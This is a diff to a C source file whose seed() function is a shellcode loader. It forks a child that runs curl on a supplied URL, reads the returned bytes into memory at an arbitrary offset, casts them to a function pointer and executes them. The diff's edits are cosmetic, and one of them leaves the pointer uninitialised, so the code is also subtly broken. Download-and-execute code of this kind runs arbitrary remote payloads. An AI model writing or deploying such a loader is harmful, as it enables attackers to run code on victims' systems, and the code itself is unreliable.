@@ -13,7 +13,6 @@ executed. */
 
 #include <unistd.h>
 #include <stdio.h>
-
 #include <stdlib.h>
 #include <string.h>
 
@@ -23,15 +22,15 @@ executed. */
 
 void seed(int offset, int bytes, char *url)
 {
-    /* Setup a buffer for Shellcode injection at some
+    /* setup a buffer for shellcode injection at some
     offset location. */
 
     unsigned char *leaf;
 
-    leaf = (char *) &leaf + offset;
+    leaf += offset;
     memset(leaf, 0, bytes);
 
-    /* Create a pipe between parent and child processes
+    /* create a pipe between parent and child processes
     which allows the output of curl to be read. */
 
     int fd[2];
@@ -43,20 +42,16 @@ void seed(int offset, int bytes, char *url)
     {
 	close(fd[1]);
     
-	/* Read the output of curl which should hopefully
+	/* read the output of curl which should hopefully
 	be some raw Shellcode bytes. Inject them directly
 	into memory. */
 
 	read(fd[0], leaf, bytes);
 
-	/* Create a function pointer to the injected code. */
+	/* create a function pointer to the injected code. */
 
 	int (*code)();
 	code = (int (*)()) leaf;
-
-	/* Execute the Shellcode. Who knows what will
-	happen next (^_^). */
-
 	code();
     }
 
@@ -72,7 +67,6 @@ void seed(int offset, int bytes, char *url)
 	/* Execute curl with given url to a Shellcode. */
 
 	char *argv[] = {curl, url, 0};
-
 	execve(curl, argv, (char **) 0);
     }
 }
